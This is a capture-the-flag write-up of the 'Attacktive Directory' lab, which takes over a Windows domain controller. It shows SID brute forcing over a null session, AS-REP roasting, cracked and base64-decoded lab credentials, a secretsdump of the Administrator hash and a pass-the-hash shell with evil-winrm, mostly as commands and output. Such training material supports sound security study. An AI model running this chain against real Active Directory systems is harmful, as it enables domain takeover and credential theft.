# Attacktive Directory
### Enumeration
```
# Nmap 7.92 scan initiated Mon May  2 11:00:12 2022 as: nmap -sCV -v -oN nmap/tcp_1000.out 10.10.179.240
Nmap scan report for ip-10-10-179-240.eu-west-1.compute.internal (10.10.179.240)
Host is up (0.0014s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-02 11:00:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-05-01T10:57:51
| Not valid after:  2022-10-31T10:57:51
| MD5:   e15f f22b a3cf b9a3 aea0 6553 8a14 5050
|_SHA-1: 4ef9 2cf3 98d6 0b6f a5a9 8130 72f1 5a07 056a 5801
|_ssl-date: 2022-05-02T11:00:47+00:00; +1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-02T11:00:38+00:00
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-05-02T11:00:41
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  2 11:00:47 2022 -- 1 IP address (1 host up) scanned in 34.73 seconds
```

##### 80
Looks like a default IIS webserver, nothing interesting after running gobuster.

##### SMB
No anonymous access. However, there is null session access. Compare the outputs below:

```
$ smbmap -H 10.10.179.240 -u anonymous -p ''
[!] Authentication error on 10.10.179.240

$ smbmap -H 10.10.179.240 -u '' -p ''
[+] IP: 10.10.179.240:445       Name: ip-10-10-179-240.eu-west-1.compute.internal
```

With null session access, we might be able to brute force SIDs:

```
$ impacket-lookupsid ''@10.10.179.240 -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.179.240
[*] StringBinding ncacn_np:10.10.179.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3591857110-2884097990-301047963
498: THM-AD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM-AD\Administrator (SidTypeUser)
501: THM-AD\Guest (SidTypeUser)
502: THM-AD\krbtgt (SidTypeUser)
512: THM-AD\Domain Admins (SidTypeGroup)
513: THM-AD\Domain Users (SidTypeGroup)
514: THM-AD\Domain Guests (SidTypeGroup)
515: THM-AD\Domain Computers (SidTypeGroup)
516: THM-AD\Domain Controllers (SidTypeGroup)
517: THM-AD\Cert Publishers (SidTypeAlias)
518: THM-AD\Schema Admins (SidTypeGroup)
519: THM-AD\Enterprise Admins (SidTypeGroup)
520: THM-AD\Group Policy Creator Owners (SidTypeGroup)
521: THM-AD\Read-only Domain Controllers (SidTypeGroup)
522: THM-AD\Cloneable Domain Controllers (SidTypeGroup)
525: THM-AD\Protected Users (SidTypeGroup)
526: THM-AD\Key Admins (SidTypeGroup)
527: THM-AD\Enterprise Key Admins (SidTypeGroup)
553: THM-AD\RAS and IAS Servers (SidTypeAlias)
571: THM-AD\Allowed RODC Password Replication Group (SidTypeAlias)
572: THM-AD\Denied RODC Password Replication Group (SidTypeAlias)
1000: THM-AD\ATTACKTIVEDIREC$ (SidTypeUser)
1101: THM-AD\DnsAdmins (SidTypeAlias)
1102: THM-AD\DnsUpdateProxy (SidTypeGroup)
1103: THM-AD\skidy (SidTypeUser)
1104: THM-AD\breakerofthings (SidTypeUser)
1105: THM-AD\james (SidTypeUser)
1106: THM-AD\optional (SidTypeUser)
1107: THM-AD\sherlocksec (SidTypeUser)
1108: THM-AD\darkstar (SidTypeUser)
1109: THM-AD\Ori (SidTypeUser)
1110: THM-AD\robin (SidTypeUser)
1111: THM-AD\paradox (SidTypeUser)
1112: THM-AD\Muirland (SidTypeUser)
1113: THM-AD\horshark (SidTypeUser)
1114: THM-AD\svc-admin (SidTypeUser)
1116: THM-AD\CompStaff (SidTypeAlias)
1117: THM-AD\dc (SidTypeGroup)
1118: THM-AD\backup (SidTypeUser)
1601: THM-AD\a-spooks (SidTypeUser)
```

We'll make a userlist:

```
$ cat sids | grep TypeUser | cut -d'\' -f2 | cut -d' ' -f1
Administrator
Guest
krbtgt
ATTACKTIVEDIREC$
skidy
breakerofthings
james
optional
sherlocksec
darkstar
Ori
robin
paradox
Muirland
horshark
svc-admin
backup
a-spooks

$ cat sids | grep TypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

Now we can AS-REP roast:

```
$ impacket-GetNPUsers -request -format hashcat -dc-ip 10.10.179.240 spookysec.local/ -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ATTACKTIVEDIREC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User skidy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User breakerofthings doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User optional doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sherlocksec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Muirland doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User horshark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:038a294bbee164218d097f8f05b52068$df48e3dbe1a6bf579b86a9c38445947b21b1ca02b7416df8ecff0bf43d1a3304f3aab0f3837b5a0815bd0c142fa38c584dbfe3ca9fc4a3be8439c62b7b7fc832edb2623ac6482abc86a15410270407f206e879b4c78c8bfb7c5f0e21f47cee75990f2291eb3f26ad26717a8723339bd2c1490a50f9291b203fa4e577799a2cfec153bef1f768b603169e5dfb2dd6b2345ca0ebc0be8945373afbb01372c94909cdcc3f44f3f11690dff963def7cd0c166a99f5cf2bc834c579ea2842e6c575a038ea4504d8ded801ff0cdea7b9a0591cd361cfc227d1518fe953fdde65e0df656624c1ce9923be94d27247f5f77bffe5aef6
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-spooks doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Hashcat is able to retrieve the password, so now we have credentials `svc-admin:management2005`. We can't find any more hashes by kerberoasting. Let's see what access we have to the share:

```
$ crackmapexec smb 10.10.179.240 --shares -u 'svc-admin' -p 'management2005'
SMB         10.10.179.240   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.179.240   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         10.10.179.240   445    ATTACKTIVEDIREC  [+] Enumerated shares
SMB         10.10.179.240   445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.179.240   445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.179.240   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.179.240   445    ATTACKTIVEDIREC  backup          READ
SMB         10.10.179.240   445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.179.240   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.179.240   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.179.240   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

We see a non-default share `backup`. We connect using `smbclient` and find a single file called `backup_credentials.txt`. It contains the string:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

This base64 decodes to:

```
backup@spookysec.local:backup2517860
```

We're able to use `impacket-secretsdump` to grab hashes:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Now we can use `evil-winrm` to pass the hash and get an administrator shell:

```
$ evil-winrm -u administrator -i 10.10.179.240 -H 0e0363213e37b94221497260b0bcb4fc

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```